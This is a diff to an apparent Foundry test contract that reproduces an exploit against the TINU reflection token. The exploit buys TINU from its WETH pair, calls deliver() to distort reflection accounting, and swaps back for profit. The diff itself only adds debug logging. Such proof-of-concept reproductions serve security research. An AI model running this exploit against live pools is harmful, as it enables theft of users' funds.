@@ -65,6 +65,9 @@ contract TINUAttacker is Test {
         emit log_named_uint("TINU tExcluded", tExcluded);  // 0
         emit log_named_uint("Pair rOwned", rPair); // 108505905800335567462313514886909726810259466467478275604883839519551731249929
         console2.log("rPair > rSupply?", rPair > rTotal-rExcluded); // true
+
+        emit log_named_uint("tPair", tinu.balanceOf(address(tinu_weth)));
+        emit log_named_uint("tPair", tinu.tokenFromReflection(rPair));
     }
 
     function testExploit() external {
@@ -77,6 +80,7 @@ contract TINUAttacker is Test {
         uint256 rExcluded = getMappingValue(address(tinu), 3, address(0xC77aab3c6D7dAb46248F3CC3033C856171878BD5));
         uint256 rAmountOut = rTotal-rExcluded;
         uint256 tinuAmountOut = tinu.tokenFromReflection(rAmountOut) - 0.1*10**9;
+        console2.log("tinuAmountOut:", tinuAmountOut);
 
         (uint reserve0, uint reserve1, ) = tinu_weth.getReserves();
         uint256 wethAmountIn = getAmountIn(tinuAmountOut, reserve1, reserve0);
@@ -89,10 +93,14 @@ contract TINUAttacker is Test {
             address(this),
             ""
         );
-
+        emit log_named_uint("rReflect", getMappingValue(address(tinu), 3, address(this)));
         tinu.deliver(tinu.balanceOf(address(this)));
+        emit log_named_uint("rTotal", uint256(vm.load(address(tinu), bytes32(uint256(13)))));
+        emit log_named_uint("rPair", getMappingValue(address(tinu), 3, address(tinu_weth)));
+        emit log_named_uint("tPair", tinu.balanceOf(address(tinu_weth)));
 
         (reserve0, reserve1, ) = tinu_weth.getReserves();
+        emit log_named_uint("reserve0", reserve0);
         uint256 wethAmountOut = getAmountOut(tinu.balanceOf(address(tinu_weth))-reserve0, reserve0, reserve1);
         tinu_weth.swap(0, wethAmountOut, address(this), "");
         emit log_named_decimal_uint("Attack profit:", wethAmountOut - wethAmountIn, weth.decimals());
